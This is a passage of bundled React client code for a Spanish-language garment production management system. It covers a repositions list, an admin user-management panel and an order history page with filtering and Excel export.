          reposition.status !== "completado" && reposition.status !== "eliminado" && /* @__PURE__ */ jsxs29(
            Button,
            {
              variant: "outline",
              size: "sm",
              className: "text-purple-600 hover:bg-purple-50",
              onClick: () => handleComplete(reposition.id),
              children: [
                /* @__PURE__ */ jsx60(Flag, { className: "w-4 h-4 mr-2" }),
                userArea === "admin" || userArea === "envios" ? "Finalizar" : "Solicitar Finalizaci\xF3n"
              ]
            }
          ),
          (userArea === "admin" || userArea === "envios") && reposition.status !== "eliminado" && /* @__PURE__ */ jsxs29(
            Button,
            {
              variant: "outline",
              size: "sm",
              className: "text-red-600 hover:bg-red-50",
              onClick: () => handleDelete(reposition.id),
              children: [
                /* @__PURE__ */ jsx60(Trash2, { className: "w-4 h-4 mr-2" }),
                "Eliminar"
              ]
            }
          )
        ] })
      ] }) })
    ] }, reposition.id)) }),
    showForm && /* @__PURE__ */ jsx60(RepositionForm, { onClose: () => setShowForm(false) }),
    selectedReposition && /* @__PURE__ */ jsx60(
      RepositionDetail,
      {
        repositionId: selectedReposition,
        onClose: () => setSelectedReposition(null)
      }
    ),
    trackedReposition && /* @__PURE__ */ jsx60(
      RepositionTracker,
      {
        repositionId: trackedReposition,
        onClose: () => setTrackedReposition(null)
      }
    ),
    printSummaryReposition && /* @__PURE__ */ jsx60(
      RepositionPrintSummary,
      {
        repositionId: printSummaryReposition,
        onClose: () => setPrintSummaryReposition(null)
      }
    )
  ] });
}

// client/src/pages/repositions-page.tsx
import { jsx as jsx61 } from "react/jsx-runtime";
function RepositionsPage() {
  const { user } = useAuth();
  if (!user) {
    return null;
  }
  return /* @__PURE__ */ jsx61(Layout, { children: /* @__PURE__ */ jsx61(RepositionList, { userArea: user.area }) });
}

// client/src/pages/admin-page.tsx
import { useState as useState36 } from "react";
import { jsx as jsx62, jsxs as jsxs30 } from "react/jsx-runtime";
function AdminPage() {
  const { user } = useAuth();
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const [selectedUser, setSelectedUser] = useState36(null);
  const [newPassword, setNewPassword] = useState36("");
  const [showResetModal, setShowResetModal] = useState36(false);
  const [editUser, setEditUser] = useState36(null);
  const [editForm, setEditForm] = useState36({ name: "", username: "", area: "", newPassword: "" });
  const [showEditModal, setShowEditModal] = useState36(false);
  if (user?.area !== "admin") {
    return /* @__PURE__ */ jsx62("div", { className: "flex items-center justify-center min-h-screen", children: /* @__PURE__ */ jsx62(Card, { className: "max-w-md", children: /* @__PURE__ */ jsxs30(CardContent, { className: "p-6 text-center", children: [
      /* @__PURE__ */ jsx62(Shield, { className: "mx-auto h-12 w-12 text-red-500 mb-4" }),
      /* @__PURE__ */ jsx62("h2", { className: "text-xl font-semibold mb-2", children: "Acceso Denegado" }),
      /* @__PURE__ */ jsx62("p", { className: "text-gray-600", children: "Solo los administradores pueden acceder a esta p\xE1gina." })
    ] }) }) });
  }
  const { data: users = [] } = useQuery({
    queryKey: ["/api/admin/users"],
    queryFn: async () => {
      const res = await apiRequest("GET", "/api/admin/users");
      return await res.json();
    }
  });
  const { data: orders = [] } = useQuery({
    queryKey: ["/api/orders"]
  });
  const { data: stats } = useQuery({
    queryKey: ["/api/dashboard/stats"]
  });
  const resetPasswordMutation = useMutation({
    mutationFn: async ({ userId, password }) => {
      const res = await apiRequest("POST", "/api/admin/reset-password", {
        userId,
        newPassword: password
      });
      return await res.json();
    },
    onSuccess: () => {
      toast2({
        title: "Contrase\xF1a restablecida",
        description: "La contrase\xF1a ha sido restablecida exitosamente"
      });
      setShowResetModal(false);
      setNewPassword("");
      setSelectedUser(null);
    },
    onError: (error) => {
      toast2({
        title: "Error al restablecer contrase\xF1a",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  const updateUserMutation = useMutation({
    mutationFn: async (data) => {
      const res = await apiRequest("PUT", `/api/admin/users/${data.id}`, data);
      return res.json();
    },
    onSuccess: () => {
      toast2({ title: "Usuario actualizado correctamente" });
      setShowEditModal(false);
      queryClient2.invalidateQueries({ queryKey: ["/api/admin/users"] });
    },
    onError: (err) => toast2({ title: "Error al actualizar", description: err.message, variant: "destructive" })
  });
  const deleteUserMutation = useMutation({
    mutationFn: async (id2) => {
      const res = await apiRequest("DELETE", `/api/admin/users/${id2}`);
      return res.json();
    },
    onSuccess: () => {
      toast2({ title: "Usuario eliminado correctamente" });
      queryClient2.invalidateQueries({ queryKey: ["/api/admin/users"] });
    },
    onError: (err) => toast2({ title: "Error al eliminar usuario", description: err.message, variant: "destructive" })
  });
  const openEditModal = (u) => {
    setEditUser(u);
    setEditForm({ name: u.name, username: u.username, area: u.area, newPassword: "" });
    setShowEditModal(true);
  };
  const handleResetPassword = () => {
    if (!selectedUser || !newPassword) return;
    resetPasswordMutation.mutate({ userId: selectedUser.id, password: newPassword });
  };
  const handleSaveEdit = () => {
    if (!editUser) return;
    const payload = { id: editUser.id, name: editForm.name, username: editForm.username, area: editForm.area };
    if (editForm.newPassword) payload.newPassword = editForm.newPassword;
    updateUserMutation.mutate(payload);
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      almacen: "Almac\xE9n",
      admin: "Admin",
      dise\u00F1o: "Dise\xF1o"
    };
    return names[area] || area;
  };
  const getAreaBadgeColor = (area) => {
    const colors = {
      corte: "bg-green-100 text-green-800",
      bordado: "bg-blue-100 text-blue-800",
      ensamble: "bg-purple-100 text-purple-800",
      plancha: "bg-orange-100 text-orange-800",
      calidad: "bg-pink-100 text-pink-800",
      envios: "bg-purple-100 text-purple-800",
      admin: "bg-gray-100 text-gray-800"
    };
    return colors[area] || "bg-gray-100 text-gray-800";
  };
  const activeOrders = orders.filter((order) => order.status === "active");
  const completedOrders = orders.filter((order) => order.status === "completed");
  const todayCompletedOrders = completedOrders.filter(
    (order) => order.completedAt && new Date(order.completedAt).toDateString() === (/* @__PURE__ */ new Date()).toDateString()
  );
  return /* @__PURE__ */ jsx62(Layout, { children: /* @__PURE__ */ jsxs30("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsxs30("div", { className: "flex items-center space-x-4", children: [
      /* @__PURE__ */ jsx62("div", { className: "w-12 h-12 bg-primary rounded-lg flex items-center justify-center", children: /* @__PURE__ */ jsx62(Settings, { className: "text-white text-2xl" }) }),
      /* @__PURE__ */ jsxs30("div", { children: [
        /* @__PURE__ */ jsx62("h1", { className: "text-3xl font-bold text-gray-800", children: "Panel de Administraci\xF3n" }),
        /* @__PURE__ */ jsx62("p", { className: "text-gray-600", children: "Gesti\xF3n del sistema JASANA" })
      ] })
    ] }),
    /* @__PURE__ */ jsxs30("div", { className: "grid grid-cols-1 md:grid-cols-4 gap-6", children: [
      /* @__PURE__ */ jsx62(Card, { children: /* @__PURE__ */ jsx62(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs30("div", { className: "flex items-center justify-between", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62("p", { className: "text-sm font-medium text-gray-600", children: "Pedidos Activos" }),
          /* @__PURE__ */ jsx62("p", { className: "text-2xl font-bold text-gray-900", children: activeOrders.length })
        ] }),
        /* @__PURE__ */ jsx62("div", { className: "w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center", children: /* @__PURE__ */ jsx62(Package, { className: "text-blue-600", size: 24 }) })
      ] }) }) }),
      /* @__PURE__ */ jsx62(Card, { children: /* @__PURE__ */ jsx62(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs30("div", { className: "flex items-center justify-between", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62("p", { className: "text-sm font-medium text-gray-600", children: "Finalizados Hoy" }),
          /* @__PURE__ */ jsx62("p", { className: "text-2xl font-bold text-gray-900", children: todayCompletedOrders.length })
        ] }),
        /* @__PURE__ */ jsx62("div", { className: "w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center", children: /* @__PURE__ */ jsx62(TrendingUp, { className: "text-green-600", size: 24 }) })
      ] }) }) }),
      /* @__PURE__ */ jsx62(Card, { children: /* @__PURE__ */ jsx62(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs30("div", { className: "flex items-center justify-between", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62("p", { className: "text-sm font-medium text-gray-600", children: "Total Completados" }),
          /* @__PURE__ */ jsx62("p", { className: "text-2xl font-bold text-gray-900", children: completedOrders.length })
        ] }),
        /* @__PURE__ */ jsx62("div", { className: "w-12 h-12 bg-purple-100 rounded-lg flex items-center justify-center", children: /* @__PURE__ */ jsx62(Package, { className: "text-purple-600", size: 24 }) })
      ] }) }) }),
      /* @__PURE__ */ jsx62(Card, { children: /* @__PURE__ */ jsx62(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs30("div", { className: "flex items-center justify-between", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62("p", { className: "text-sm font-medium text-gray-600", children: "Usuarios Registrados" }),
          /* @__PURE__ */ jsx62("p", { className: "text-2xl font-bold text-gray-900", children: users.length })
        ] }),
        /* @__PURE__ */ jsx62("div", { className: "w-12 h-12 bg-orange-100 rounded-lg flex items-center justify-center", children: /* @__PURE__ */ jsx62(Users, { className: "text-orange-600", size: 24 }) })
      ] }) }) })
    ] }),
    /* @__PURE__ */ jsxs30(Card, { children: [
      /* @__PURE__ */ jsx62(CardHeader, { children: /* @__PURE__ */ jsxs30(CardTitle, { className: "flex items-center space-x-2", children: [
        /* @__PURE__ */ jsx62(Users, { className: "h-5 w-5" }),
        /* @__PURE__ */ jsx62("span", { children: "Gesti\xF3n de Usuarios" })
      ] }) }),
      /* @__PURE__ */ jsx62(CardContent, { children: users.length > 0 ? /* @__PURE__ */ jsxs30(Table, { children: [
        /* @__PURE__ */ jsx62(TableHeader, { children: /* @__PURE__ */ jsxs30(TableRow, { children: [
          /* @__PURE__ */ jsx62(TableHead, { children: "ID" }),
          /* @__PURE__ */ jsx62(TableHead, { children: "Usuario" }),
          /* @__PURE__ */ jsx62(TableHead, { children: "Nombre" }),
          /* @__PURE__ */ jsx62(TableHead, { children: "\xC1rea" }),
          /* @__PURE__ */ jsx62(TableHead, { children: "Estado" }),
          /* @__PURE__ */ jsx62(TableHead, { children: "Acciones" })
        ] }) }),
        /* @__PURE__ */ jsx62(TableBody, { children: users.map((u) => /* @__PURE__ */ jsxs30(TableRow, { children: [
          /* @__PURE__ */ jsx62(TableCell, { children: u.id }),
          /* @__PURE__ */ jsx62(TableCell, { children: u.username }),
          /* @__PURE__ */ jsx62(TableCell, { children: u.name }),
          /* @__PURE__ */ jsx62(TableCell, { children: /* @__PURE__ */ jsx62(Badge, { className: getAreaBadgeColor(u.area), children: getAreaDisplayName(u.area) }) }),
          /* @__PURE__ */ jsx62(TableCell, { children: u.active ? "Activo" : "Inactivo" }),
          /* @__PURE__ */ jsxs30(TableCell, { className: "flex gap-2", children: [
            /* @__PURE__ */ jsx62(Button, { size: "sm", variant: "outline", onClick: () => openEditModal(u), children: "Editar" }),
            /* @__PURE__ */ jsx62(Button, { size: "sm", variant: "outline", onClick: () => {
              setSelectedUser(u);
              setShowResetModal(true);
            }, children: "Reset Pwd" }),
            /* @__PURE__ */ jsx62(Button, { size: "sm", variant: "destructive", onClick: () => deleteUserMutation.mutate(u.id), children: "Eliminar" })
          ] })
        ] }, u.id)) })
      ] }) : /* @__PURE__ */ jsx62("p", { className: "text-center text-gray-500", children: "No hay usuarios registrados." }) })
    ] }),
    /* @__PURE__ */ jsxs30(Card, { children: [
      /* @__PURE__ */ jsx62(CardHeader, { children: /* @__PURE__ */ jsxs30(CardTitle, { className: "flex items-center space-x-2", children: [
        /* @__PURE__ */ jsx62(Settings, { className: "h-5 w-5" }),
        /* @__PURE__ */ jsx62("span", { children: "Configuraci\xF3n del Sistema" })
      ] }) }),
      /* @__PURE__ */ jsx62(CardContent, { children: /* @__PURE__ */ jsxs30("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-6", children: [
        /* @__PURE__ */ jsxs30("div", { className: "space-y-4", children: [
          /* @__PURE__ */ jsx62("h3", { className: "font-semibold text-gray-800", children: "Configuraci\xF3n General" }),
          /* @__PURE__ */ jsxs30("div", { className: "space-y-2", children: [
            /* @__PURE__ */ jsxs30("div", { className: "flex justify-between items-center p-3 bg-gray-50 rounded-lg", children: [
              /* @__PURE__ */ jsx62("span", { className: "text-sm", children: "Nombre de la empresa" }),
              /* @__PURE__ */ jsx62("span", { className: "text-sm font-medium", children: "JASANA" })
            ] }),
            /* @__PURE__ */ jsxs30("div", { className: "flex justify-between items-center p-3 bg-gray-50 rounded-lg", children: [
              /* @__PURE__ */ jsx62("span", { className: "text-sm", children: "\xC1reas activas" }),
              /* @__PURE__ */ jsx62("span", { className: "text-sm font-medium", children: "7 \xE1reas" })
            ] }),
            /* @__PURE__ */ jsxs30("div", { className: "flex justify-between items-center p-3 bg-gray-50 rounded-lg", children: [
              /* @__PURE__ */ jsx62("span", { className: "text-sm", children: "Base de datos" }),
              /* @__PURE__ */ jsx62("span", { className: "text-sm font-medium text-green-600", children: "Conectada" })
            ] })
          ] })
        ] }),
        /* @__PURE__ */ jsxs30("div", { className: "space-y-4", children: [
          /* @__PURE__ */ jsx62("h3", { className: "font-semibold text-gray-800", children: "Acciones de Administrador" }),
          /* @__PURE__ */ jsxs30("div", { className: "space-y-2", children: [
            /* @__PURE__ */ jsxs30(Button, { variant: "outline", className: "w-full justify-start", disabled: true, children: [
              /* @__PURE__ */ jsx62(RotateCcw, { className: "mr-2 h-4 w-4" }),
              "Respaldar Base de Datos"
            ] }),
            /* @__PURE__ */ jsxs30(Button, { variant: "outline", className: "w-full justify-start", disabled: true, children: [
              /* @__PURE__ */ jsx62(Settings, { className: "mr-2 h-4 w-4" }),
              "Configurar Notificaciones"
            ] }),
            /* @__PURE__ */ jsxs30(Button, { variant: "outline", className: "w-full justify-start", disabled: true, children: [
              /* @__PURE__ */ jsx62(Users, { className: "mr-2 h-4 w-4" }),
              "Exportar Reportes"
            ] })
          ] })
        ] })
      ] }) })
    ] }),
    /* @__PURE__ */ jsxs30(Card, { children: [
      /* @__PURE__ */ jsx62(CardHeader, { children: /* @__PURE__ */ jsx62(CardTitle, { children: "Actividad Reciente del Sistema" }) }),
      /* @__PURE__ */ jsx62(CardContent, { children: /* @__PURE__ */ jsx62("div", { className: "space-y-4", children: orders.slice(0, 5).map((order) => /* @__PURE__ */ jsxs30("div", { className: "flex items-center justify-between p-3 bg-gray-50 rounded-lg", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62("p", { className: "font-medium", children: order.folio }),
          /* @__PURE__ */ jsx62("p", { className: "text-sm text-gray-600", children: order.clienteHotel })
        ] }),
        /* @__PURE__ */ jsxs30("div", { className: "text-right", children: [
          /* @__PURE__ */ jsx62(Badge, { className: getAreaBadgeColor(order.currentArea), children: getAreaDisplayName(order.currentArea) }),
          /* @__PURE__ */ jsx62("p", { className: "text-xs text-gray-500 mt-1", children: new Date(order.createdAt).toLocaleDateString("es-ES") })
        ] })
      ] }, order.id)) }) })
    ] }),
    /* @__PURE__ */ jsx62(Dialog2, { open: showResetModal, onOpenChange: setShowResetModal, children: /* @__PURE__ */ jsxs30(DialogContent2, { children: [
      /* @__PURE__ */ jsx62(DialogHeader, { children: /* @__PURE__ */ jsx62(DialogTitle2, { children: "Restablecer Contrase\xF1a" }) }),
      /* @__PURE__ */ jsxs30("div", { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "Usuario" }),
          /* @__PURE__ */ jsx62(Input, { readOnly: true, value: selectedUser?.username || "" })
        ] }),
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "Nueva Contrase\xF1a" }),
          /* @__PURE__ */ jsx62(Input, { type: "password", value: newPassword, onChange: (e) => setNewPassword(e.target.value) })
        ] }),
        /* @__PURE__ */ jsxs30("div", { className: "flex justify-end gap-2", children: [
          /* @__PURE__ */ jsx62(Button, { variant: "outline", onClick: () => setShowResetModal(false), children: "Cancelar" }),
          /* @__PURE__ */ jsx62(Button, { onClick: handleResetPassword, disabled: !newPassword, children: "Restablecer" })
        ] })
      ] })
    ] }) }),
    /* @__PURE__ */ jsx62(Dialog2, { open: showEditModal, onOpenChange: setShowEditModal, children: /* @__PURE__ */ jsxs30(DialogContent2, { children: [
      /* @__PURE__ */ jsx62(DialogHeader, { children: /* @__PURE__ */ jsx62(DialogTitle2, { children: "Editar Usuario" }) }),
      /* @__PURE__ */ jsxs30("div", { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "Nombre" }),
          /* @__PURE__ */ jsx62(Input, { value: editForm.name, onChange: (e) => setEditForm({ ...editForm, name: e.target.value }) })
        ] }),
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "Username" }),
          /* @__PURE__ */ jsx62(Input, { value: editForm.username, onChange: (e) => setEditForm({ ...editForm, username: e.target.value }) })
        ] }),
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "\xC1rea" }),
          /* @__PURE__ */ jsxs30(Select2, { value: editForm.area, onValueChange: (val) => setEditForm({ ...editForm, area: val }), children: [
            /* @__PURE__ */ jsx62(SelectTrigger2, { children: /* @__PURE__ */ jsx62(SelectValue2, {}) }),
            /* @__PURE__ */ jsx62(SelectContent2, { children: ["admin", "corte", "bordado", "ensamble", "plancha", "calidad", "envios"].map((a) => /* @__PURE__ */ jsx62(SelectItem2, { value: a, children: getAreaDisplayName(a) }, a)) })
          ] })
        ] }),
        /* @__PURE__ */ jsxs30("div", { children: [
          /* @__PURE__ */ jsx62(Label2, { children: "Nueva Contrase\xF1a (opcional)" }),
          /* @__PURE__ */ jsx62(Input, { type: "password", value: editForm.newPassword, onChange: (e) => setEditForm({ ...editForm, newPassword: e.target.value }) })
        ] }),
        /* @__PURE__ */ jsxs30("div", { className: "flex justify-end gap-2", children: [
          /* @__PURE__ */ jsx62(Button, { variant: "outline", onClick: () => setShowEditModal(false), children: "Cancelar" }),
          /* @__PURE__ */ jsx62(Button, { onClick: handleSaveEdit, children: "Guardar Cambios" })
        ] })
      ] })
    ] }) })
  ] }) });
}

// client/src/pages/history-page.tsx
import { useState as useState37 } from "react";
import { Fragment as Fragment11, jsx as jsx63, jsxs as jsxs31 } from "react/jsx-runtime";
function HistoryPage() {
  const [searchTerm, setSearchTerm] = useState37("");
  const [statusFilter, setStatusFilter] = useState37("all");
  const [areaFilter, setAreaFilter] = useState37("all");
  const [dateFilter, setDateFilter] = useState37("all");
  const [isExporting, setIsExporting] = useState37(false);
  const { toast: toast2 } = useToast();
  const { data: orders = [], isLoading } = useQuery({
    queryKey: ["/api/orders"]
  });
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const getAreaBadgeColor = (area) => {
    const colors = {
      corte: "bg-green-100 text-green-800",
      bordado: "bg-blue-100 text-blue-800",
      ensamble: "bg-purple-100 text-purple-800",
      plancha: "bg-orange-100 text-orange-800",
      calidad: "bg-pink-100 text-pink-800",
      envios: "bg-purple-100 text-purple-800",
      almacen: "bg-indigo-100 text-indigo-800",
      admin: "bg-gray-100 text-gray-800"
    };
    return colors[area] || "bg-gray-100 text-gray-800";
  };
  const getStatusBadgeColor = (status) => {
    return status === "completed" ? "bg-green-100 text-green-800" : "bg-yellow-100 text-yellow-800";
  };
  const formatDate = (date) => {
    const d = typeof date === "string" ? new Date(date) : date;
    return d.toLocaleDateString("es-ES", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });
  };
  const filterOrdersByDate = (order) => {
    if (dateFilter === "all") return true;
    const orderDate = new Date(order.createdAt);
    const now = /* @__PURE__ */ new Date();
    switch (dateFilter) {
      case "today":
        return orderDate.toDateString() === now.toDateString();
      case "week":
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1e3);
        return orderDate >= weekAgo;
      case "month":
        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1e3);
        return orderDate >= monthAgo;
      default:
        return true;
    }
  };
  const filteredOrders = orders.filter((order) => {
    const matchesSearch = searchTerm === "" || order.folio.toLowerCase().includes(searchTerm.toLowerCase()) || order.clienteHotel.toLowerCase().includes(searchTerm.toLowerCase()) || order.modelo.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesArea = areaFilter === "all" || order.currentArea === areaFilter;
    const matchesStatus = statusFilter === "all" || order.status === statusFilter;
    const matchesDate = filterOrdersByDate(order);
    return matchesSearch && matchesArea && matchesStatus && matchesDate;
  });
  const completedOrders = filteredOrders.filter((order) => order.status === "completed");
  const activeOrders = filteredOrders.filter((order) => order.status === "active");
  const handleExportToExcel = async () => {
    setIsExporting(true);
    try {
      const response = await fetch("/api/history/export", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          searchTerm,
          statusFilter,
          areaFilter,
          dateFilter,
          orders: filteredOrders
        })
      });
      if (!response.ok) {
        throw new Error("Error al exportar datos");
      }
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.style.display = "none";
      a.href = url;
      a.download = `historial-pedidos-${(/* @__PURE__ */ new Date()).toISOString().split("T")[0]}.xlsx`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      toast2({
        title: "\xC9xito",
        description: "Historial exportado correctamente"
      });
    } catch (error) {
      console.error("Export error:", error);
      toast2({
        title: "Error",
        description: "No se pudo exportar el historial",
        variant: "destructive"
      });
    } finally {
      setIsExporting(false);
    }
  };
  return /* @__PURE__ */ jsx63(Layout, { children: /* @__PURE__ */ jsxs31("div", { className: "space-y-6", children: [
    /* @__PURE__ */ jsxs31("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsxs31("div", { children: [
        /* @__PURE__ */ jsx63("h1", { className: "text-3xl font-bold text-gray-800", children: "Historial de Pedidos" }),
        /* @__PURE__ */ jsx63("p", { className: "text-gray-600 mt-2", children: "Registro completo de todos los pedidos del sistema" })
      ] }),
      /* @__PURE__ */ jsxs31(
        Button,
        {
          variant: "outline",
          onClick: handleExportToExcel,
          disabled: isExporting || filteredOrders.length === 0,
          children: [
            /* @__PURE__ */ jsx63(Download, { className: "mr-2 h-4 w-4" }),
            isExporting ? "Exportando..." : "Exportar Excel"
          ]
        }
      )
    ] }),
    /* @__PURE__ */ jsxs31("div", { className: "grid grid-cols-1 md:grid-cols-4 gap-6", children: [
      /* @__PURE__ */ jsx63(Card, { children: /* @__PURE__ */ jsx63(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs31("div", { className: "text-center", children: [
        /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium text-gray-600", children: "Total de Pedidos" }),
        /* @__PURE__ */ jsx63("p", { className: "text-2xl font-bold text-gray-900", children: filteredOrders.length })
      ] }) }) }),
      /* @__PURE__ */ jsx63(Card, { children: /* @__PURE__ */ jsx63(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs31("div", { className: "text-center", children: [
        /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium text-gray-600", children: "Pedidos Activos" }),
        /* @__PURE__ */ jsx63("p", { className: "text-2xl font-bold text-blue-600", children: activeOrders.length })
      ] }) }) }),
      /* @__PURE__ */ jsx63(Card, { children: /* @__PURE__ */ jsx63(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs31("div", { className: "text-center", children: [
        /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium text-gray-600", children: "Pedidos Completados" }),
        /* @__PURE__ */ jsx63("p", { className: "text-2xl font-bold text-green-600", children: completedOrders.length })
      ] }) }) }),
      /* @__PURE__ */ jsx63(Card, { children: /* @__PURE__ */ jsx63(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs31("div", { className: "text-center", children: [
        /* @__PURE__ */ jsx63("p", { className: "text-sm font-medium text-gray-600", children: "Tasa de \xC9xito" }),
        /* @__PURE__ */ jsxs31("p", { className: "text-2xl font-bold text-purple-600", children: [
          filteredOrders.length > 0 ? Math.round(completedOrders.length / filteredOrders.length * 100) : 0,
          "%"
        ] })
      ] }) }) })
    ] }),
    /* @__PURE__ */ jsxs31(Card, { children: [
      /* @__PURE__ */ jsx63(CardHeader, { children: /* @__PURE__ */ jsxs31(CardTitle, { className: "flex items-center space-x-2", children: [
        /* @__PURE__ */ jsx63(Filter, { className: "h-5 w-5" }),
        /* @__PURE__ */ jsx63("span", { children: "Filtros" })
      ] }) }),
      /* @__PURE__ */ jsx63(CardContent, { children: /* @__PURE__ */ jsxs31("div", { className: "grid grid-cols-1 md:grid-cols-4 gap-4", children: [
        /* @__PURE__ */ jsxs31("div", { className: "relative", children: [
          /* @__PURE__ */ jsx63(
            Input,
            {
              type: "text",
              placeholder: "Buscar pedidos...",
              className: "pl-10",
              value: searchTerm,
              onChange: (e) => setSearchTerm(e.target.value)
            }
          ),
          /* @__PURE__ */ jsx63(Search, { className: "absolute left-3 top-3 h-4 w-4 text-gray-400" })
        ] }),
        /* @__PURE__ */ jsxs31(Select2, { value: statusFilter, onValueChange: setStatusFilter, children: [
          /* @__PURE__ */ jsx63(SelectTrigger2, { children: /* @__PURE__ */ jsx63(SelectValue2, { placeholder: "Estado" }) }),
          /* @__PURE__ */ jsxs31(SelectContent2, { children: [
            /* @__PURE__ */ jsx63(SelectItem2, { value: "all", children: "Todos los Estados" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "active", children: "En Proceso" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "completed", children: "Finalizados" })
          ] })
        ] }),
        /* @__PURE__ */ jsxs31(Select2, { value: areaFilter, onValueChange: setAreaFilter, children: [
          /* @__PURE__ */ jsx63(SelectTrigger2, { children: /* @__PURE__ */ jsx63(SelectValue2, { placeholder: "\xC1rea" }) }),
          /* @__PURE__ */ jsxs31(SelectContent2, { children: [
            /* @__PURE__ */ jsx63(SelectItem2, { value: "all", children: "Todas las \xC1reas" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "corte", children: "Corte" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "bordado", children: "Bordado" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "ensamble", children: "Ensamble" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "plancha", children: "Plancha/Empaque" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "calidad", children: "Calidad" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "envios", children: "Env\xEDos" })
          ] })
        ] }),
        /* @__PURE__ */ jsxs31(Select2, { value: dateFilter, onValueChange: setDateFilter, children: [
          /* @__PURE__ */ jsx63(SelectTrigger2, { children: /* @__PURE__ */ jsx63(SelectValue2, { placeholder: "Per\xEDodo" }) }),
          /* @__PURE__ */ jsxs31(SelectContent2, { children: [
            /* @__PURE__ */ jsx63(SelectItem2, { value: "all", children: "Todo el tiempo" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "today", children: "Hoy" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "week", children: "\xDAltima semana" }),
            /* @__PURE__ */ jsx63(SelectItem2, { value: "month", children: "\xDAltimo mes" })
          ] })
        ] })
      ] }) })
    ] }),
    /* @__PURE__ */ jsxs31(Card, { children: [
      /* @__PURE__ */ jsx63(CardHeader, { children: /* @__PURE__ */ jsxs31(CardTitle, { children: [
        "Historial de Pedidos (",
        filteredOrders.length,
        ")"
      ] }) }),
      /* @__PURE__ */ jsx63(CardContent, { children: isLoading ? /* @__PURE__ */ jsx63("div", { className: "animate-pulse space-y-4", children: [...Array(5)].map((_, i) => /* @__PURE__ */ jsx63("div", { className: "h-20 bg-gray-200 rounded" }, i)) }) : /* @__PURE__ */ jsxs31("div", { className: "space-y-4", children: [
        filteredOrders.map((order) => /* @__PURE__ */ jsx63("div", { className: "border border-gray-200 rounded-lg p-4 hover:bg-gray-50 transition-colors", children: /* @__PURE__ */ jsxs31("div", { className: "flex justify-between items-start", children: [
          /* @__PURE__ */ jsxs31("div", { className: "flex-1", children: [
            /* @__PURE__ */ jsxs31("div", { className: "flex items-center space-x-4 mb-2", children: [
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("h3", { className: "font-semibold text-gray-800", children: order.folio }),
                /* @__PURE__ */ jsx63("p", { className: "text-sm text-gray-600", children: order.clienteHotel })
              ] }),
              /* @__PURE__ */ jsx63(Badge, { className: getStatusBadgeColor(order.status), children: order.status === "completed" ? "Finalizado" : "En Proceso" }),
              /* @__PURE__ */ jsx63(Badge, { className: getAreaBadgeColor(order.currentArea), children: getAreaDisplayName(order.currentArea) })
            ] }),
            /* @__PURE__ */ jsxs31("div", { className: "grid grid-cols-1 md:grid-cols-3 gap-4 text-sm text-gray-600", children: [
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "Modelo:" }),
                " ",
                order.modelo
              ] }),
              /* @__PURE__ */ jsxs31("div", { children: [
                /* @__PURE__ */ jsx63("span", { className: "font-medium", children: "Tipo:" }),
                " ",
                order.tipoPrenda
              ] }),
              /* @__PURE__ */ jsxs31("div", { children: [
